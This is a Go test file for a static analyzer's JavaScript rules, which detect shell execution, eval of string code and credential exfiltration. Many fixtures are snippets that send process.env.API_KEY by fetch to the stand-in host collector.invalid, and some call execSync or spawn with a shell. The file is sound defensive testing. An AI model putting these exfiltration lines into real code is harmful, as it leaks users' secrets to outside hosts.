//go:build !coreonly && cgo

package javascript_test

import (
	"strings"
	"testing"

	"github.com/skarm/scout/internal/analysis/document"
	"github.com/skarm/scout/internal/analysis/languages/javascript"
	"github.com/skarm/scout/internal/capture/artifact"
)

func TestScalarUpdatesAndAssignments(t *testing.T) {
	for _, tc := range []struct {
		name, setup, call, rule string
		count                   int
	}{
		{"ordinary", "let send=fetch;", `send('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 1},
		{"literal numeric argument", "", `eval(17)`, "JS002", 0},
		{"commented numeric argument", "", `eval(/* ordinary */ 17)`, "JS002", 0},
		{"commented string argument", "", `eval(/* ordinary */ 'sample')`, "JS002", 1},
		{"awaited object", "", `eval(await fetch('https://collector.invalid'))`, "JS002", 0},
		{"commented awaited object", "", `eval(await /* ordinary */ fetch('https://collector.invalid'))`, "JS002", 0},
		{"commented module argument", "const run=require(/* ordinary */'node:child_process').execSync;", `run('printf ready')`, "JS001", 1},
		{"increment", "let send=fetch;send++;", `send('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 0},
		{"decrement", "let send=fetch;--send;", `send('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 0},
		{"parenthesized update", "let send=fetch;(send)++;", `send('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 0},
		{"parenthesized assignment", "let send=fetch;(send)=()=>{};", `send('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 0},
		{"parenthesized compound assignment", "let send=fetch;(send)+=1;", `send('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 0},
		{"commented parenthesized callee", "let send=fetch;", `(/* comment */send)('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 1},
		{"escaped", `let send=fetch;se\u006ed++;`, `send('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 0},
		{"captured callee", "let send=fetch;", `send('https://collector.invalid',{body:process.env.API_KEY},send++)`, "JS003", 1},
		{"unrelated", "let send=fetch;let i=0;i++;", `send('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 1},
		{"saved alias", "let send=fetch;const saved=send;send++;", `saved('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 1},
		{"restored", "let send=fetch;send++;send=fetch;", `send('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 1},
		{"process alias", "let run=require('node:child_process').execSync;run++;", `run('printf ready')`, "JS001", 0},
		{"postfix numeric", "let value='123';", `eval(value++)`, "JS002", 0},
		{"prefix numeric", "let value='123';", `eval(++value)`, "JS002", 0},
		{"updated binding numeric", "let value='123';value++;", `eval(value)`, "JS002", 0},
		{"saved string copy", "let value='123';const saved=value;value++;", `eval(saved)`, "JS002", 1},
		{"postfix callee numeric", "let send=fetch;", `(send++)('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 0},
		{"prefix credential origin", "let value=process.env.API_KEY;", `fetch('https://collector.invalid',{body:++value})`, "JS003", 1},
		{"postfix credential origin", "let value=process.env.API_KEY;", `fetch('https://collector.invalid',{body:value++})`, "JS003", 1},
		{"updated credential origin", "let value=process.env.API_KEY;value++;", `fetch('https://collector.invalid',{body:value})`, "JS003", 1},
		{"compound captures left before right", "let value=process.env.API_KEY;value+=(value='public');", `fetch('https://collector.invalid',{body:value})`, "JS003", 1},
		{"numeric compound", "let value='123';value-=1;", `eval(value)`, "JS002", 0},
		{"numeric addition", "let value=1;value+=2;", `eval(value)`, "JS002", 0},
		{"binary numeric addition", "", `eval(1+2)`, "JS002", 0},
		{"binary numeric subtraction", "", `eval(2-1)`, "JS002", 0},
		{"binary string subtraction", "", `eval('1'-1)`, "JS002", 0},
		{"binary comparison", "", `eval(1<2)`, "JS002", 0},
		{"binary boolean addition", "", `eval(true+false)`, "JS002", 0},
		{"binary null addition", "", `eval(null+1)`, "JS002", 0},
		{"binary nested numeric addition", "", `eval((1+2)+3)`, "JS002", 0},
		{"binary updated numeric addition", "let value='123';", `eval(value+++1)`, "JS002", 0},
		{"binary string concatenation", "", `eval('a'+'b')`, "JS002", 1},
		{"binary object addition", "", `eval({}+1)`, "JS002", 1},
		{"binary short circuit", "let send=fetch;true||(send=()=>{});", `send('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 1},
		{"binary nullish callable", "const send=null??fetch;", `send('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 1},
		{"compound boolean addition", "let value=true;value+=false;", `eval(value)`, "JS002", 0},
		{"compound null addition", "let value=null;value+=1;", `eval(value)`, "JS002", 0},
		{"string addition", "let value='1';value+=2;", `eval(value)`, "JS002", 1},
		{"or assignment skips side effect", "let send=fetch;let flag=true;flag||=(send=()=>{});", `send('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 1},
		{"and assignment skips side effect", "let send=fetch;let flag=false;flag&&=(send=()=>{});", `send('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 1},
		{"or assignment executes side effect", "let send=fetch;let flag=false;flag||=(send=()=>{});", `send('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 0},
		{"nullish callable assignment", "let send=null;send??=fetch;", `send('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 1},
		{"nullish preserves callable", "let send=fetch;send??=()=>{};", `send('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 1},
		{"nullish keeps false", "let send=false;send??=fetch;", `send('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 0},
		{"nullish skips side effect", "let send=fetch;let value=0;value??=(send=()=>{});", `send('https://collector.invalid',{body:process.env.API_KEY})`, "JS003", 1},
		{"compound target evaluated once", "const run=require('node:child_process').execSync;", `object[run('printf ready')]+=1`, "JS001", 1},
		{"numeric unary", "let value='123';", `eval(-value)`, "JS002", 0},
		{"numeric unary credential origin", "let value=process.env.API_KEY;", `fetch('https://collector.invalid',{body:-value})`, "JS003", 1},
		{"void discards credential value", "let value=process.env.API_KEY;", `fetch('https://collector.invalid',{body:void value})`, "JS003", 0},
	} {
		t.Run(tc.name, func(t *testing.T) {
			for _, ext := range []string{"js", "ts"} {
				t.Run(ext, func(t *testing.T) {
					text := tc.setup + "\n" + tc.call + ";"
					doc := scalarDocument(t, "input."+ext, text)
					found := false
					for _, r := range javascript.Rules() {
						if r.Rule().ID != tc.rule {
							continue
						}
						found = true
						result, err := r.Find(t.Context(), doc, 10)
						if err != nil || result.Truncated || len(result.Matches) != tc.count {
							t.Fatalf("%s matches=%d want=%d err=%v", ext, len(result.Matches), tc.count, err)
						}
					}
					if !found {
						t.Fatal("rule not registered")
					}
				})
			}
		})
	}
}

func TestConditionalAssignmentsRetainUncertainty(t *testing.T) {
	for _, extension := range []string{"js", "ts"} {
		for _, operator := range []string{"||=", "&&=", "??="} {
			t.Run(extension+operator, func(t *testing.T) {
				for _, initial := range []string{"let value=unknown;", "let value;if(flag){value='0'}else{value=0}"} {
					if operator == "??=" && initial != "let value=unknown;" {
						initial = "let value;if(flag){value='null'}else{value=null}"
					}
					text := "let send=fetch;" + initial + ";value" + operator + "(send=()=>{});send('https://collector.invalid',{body:process.env.API_KEY});"
					doc := scalarDocument(t, "input."+extension, text)
					found := false
					for _, rule := range javascript.Rules() {
						if rule.Rule().ID != "JS003" {
							continue
						}
						found = true
						result, err := rule.Find(t.Context(), doc, 10)
						if err != nil || !result.Truncated || len(result.Matches) != 0 {
							t.Fatalf("conditional callable remained certain: %+v %v", result, err)
						}
						break
					}
					if !found {
						t.Fatal("JS003 is not registered")
					}
				}
			})
		}
	}
}

func TestUnavailableStringValueDoesNotResolveLogicalCondition(t *testing.T) {
	half := strings.Repeat("x", 8192)
	for _, tc := range []struct {
		name, expression string
		wantLimited      bool
	}{
		{"concat at limit", "'" + half + "' + '" + half + "'", false},
		{"concat above limit", "'" + half + "' + '" + half + "x'", true},
		{"template at limit", "`" + half + half + "`", false},
		{"template above limit", "`" + half + half + "x`", true},
		{"template escape", "`\\u0061`", true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			doc := scalarDocument(t, "input.js", "("+tc.expression+") || 0;")
			for _, rule := range javascript.Rules() {
				if rule.Rule().ID != "JS002" {
					continue
				}
				result, err := rule.Find(t.Context(), doc, 10)
				if err != nil || result.Truncated != tc.wantLimited || len(result.Matches) != 0 {
					t.Fatalf("logical condition coverage: result=%+v err=%v want limited=%t", result, err, tc.wantLimited)
				}
				return
			}
			t.Fatal("JS002 is not registered")
		})
	}
}

func TestNumericOperatorResultsAreNotCode(t *testing.T) {
	for _, extension := range []string{"js", "ts"} {
		for _, operator := range []string{"-=", "*=", "/=", "%=", "**=", "<<=", ">>=", ">>>=", "&=", "|=", "^="} {
			t.Run(extension+operator, func(t *testing.T) {
				text := "let value='123';value" + operator + "2;eval(value);"
				doc := scalarDocument(t, "input."+extension, text)
				for _, rule := range javascript.Rules() {
					if rule.Rule().ID != "JS002" {
						continue
					}
					result, err := rule.Find(t.Context(), doc, 10)
					if err != nil || result.Truncated || len(result.Matches) != 0 {
						t.Fatalf("numeric result became code: %+v %v", result, err)
					}
					return
				}
				t.Fatal("JS002 is not registered")
			})
		}
	}
}

func scalarDocument(t *testing.T, name, text string) document.File {
	t.Helper()
	doc := document.Prepare(t.Context(), artifact.NewFile(name, []byte(text), false))
	units := doc.Units()
	if len(units) != 1 || units[0].Tree == nil || units[0].Status != "parsed_limited" {
		t.Fatalf("scalar fixture lacks supported native syntax: %+v", doc.Diagnostics())
	}
	return doc
}

func TestTypeScriptScalarTargetsThroughTypeWrappers(t *testing.T) {
	for _, mutation := range []string{"(send as any)++;", "send!++;", "(send as any)=()=>{};", "(send as any)+=1;"} {
		t.Run(mutation, func(t *testing.T) {
			doc := scalarDocument(t, "input.ts", "let send=fetch;"+mutation+"send('https://collector.invalid',{body:process.env.API_KEY});")
			for _, rule := range javascript.Rules() {
				if rule.Rule().ID != "JS003" {
					continue
				}
				result, err := rule.Find(t.Context(), doc, 10)
				if err != nil || result.Truncated || len(result.Matches) != 0 {
					t.Fatalf("type wrapper retained old callable: %+v %v", result, err)
				}
				return
			}
			t.Fatal("JS003 is not registered")
		})
	}
}

func TestShellOptionsSurviveBranchJoin(t *testing.T) {
	for _, tc := range []struct {
		name, setup string
		want        bool
	}{
		{name: "direct", setup: `let options = {shell: true};`, want: true},
		{name: "both branches", setup: `let options; if (condition) { options = {shell: true}; } else { options = {shell: true}; }`, want: true},
		{name: "one branch", setup: `let options = {shell: false}; if (condition) { options = {shell: true}; }`, want: true},
		{name: "alias through branches", setup: `const shared = {shell: true}; let selected; if (condition) { selected = shared; } else { selected = shared; } const options = selected;`, want: true},
		{name: "nested branches", setup: `let options = {shell: false}; if (outer) { if (inner) { options = {shell: true}; } }`, want: true},
		{name: "neither branch", setup: `let options; if (condition) { options = {shell: false}; } else { options = {shell: false}; }`},
		{name: "overwritten after join", setup: `let options; if (condition) { options = {shell: true}; } else { options = {shell: true}; } options = {shell: false};`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			const sink = `spawn("tool", [], options)`
			text := `import {spawn} from "node:child_process";` + "\n" + tc.setup + "\n" + sink + ";"
			doc := document.Prepare(t.Context(), artifact.NewFile("fixture.js", []byte(text), false))
			for _, rule := range javascript.Rules() {
				if rule.Rule().ID != "JS001" {
					continue
				}
				result, err := rule.Find(t.Context(), doc, 10)
				if err != nil || result.Truncated {
					t.Fatalf("incomplete analysis: %+v, %v", result, err)
				}
				if !tc.want {
					if len(result.Matches) != 0 {
						t.Fatalf("non-shell options classified as shell execution: %+v", result)
					}
					return
				}
				if len(result.Matches) != 1 {
					t.Fatalf("shell execution lost after branch: %+v", result)
				}
				match := result.Matches[0]
				start := strings.Index(text, sink)
				if match.Start != start || match.End != start+len(sink) || text[match.Start:match.End] != sink {
					t.Fatalf("incorrect shell execution evidence: %+v", match)
				}
				return
			}
			t.Fatal("JS001 is not registered")
		})
	}
}
